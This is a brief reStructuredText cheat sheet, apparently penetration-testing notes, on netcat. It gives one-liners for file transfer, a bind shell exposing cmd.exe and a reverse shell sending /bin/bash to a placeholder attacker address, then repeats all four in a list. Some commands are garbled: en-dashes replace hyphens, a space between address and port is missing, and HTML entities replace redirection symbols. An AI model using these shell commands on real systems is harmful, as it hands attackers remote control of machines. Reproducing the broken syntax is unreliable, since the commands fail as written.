Netcat
======

Shells
------

Server 

.. code-block:: shell

	nc –nlvp <port> > incoming.exe

Client

.. code-block:: shell
	
	nc –nv <your_ip_address> <port> < /path/to/the/file.exe

Bind Shell

.. code-block:: shell
	
	nc –nlvp <port> –e cmd.exe

Reverse shell

.. code-block:: shell
	
	nc –nv <your_ip_address><port> -e /bin/bash

File Transfer
-------------

- Server: nc –nlvp <port> &gt; incoming.exe
- Client: nc –nv <your_ip_address> <port> &lt; /path/to/the/file.exe
- Bind shell: nc –nlvp <port> –e cmd.exe
- Reverse shell: nc –nv <your_ip_address><port> -e /bin/bash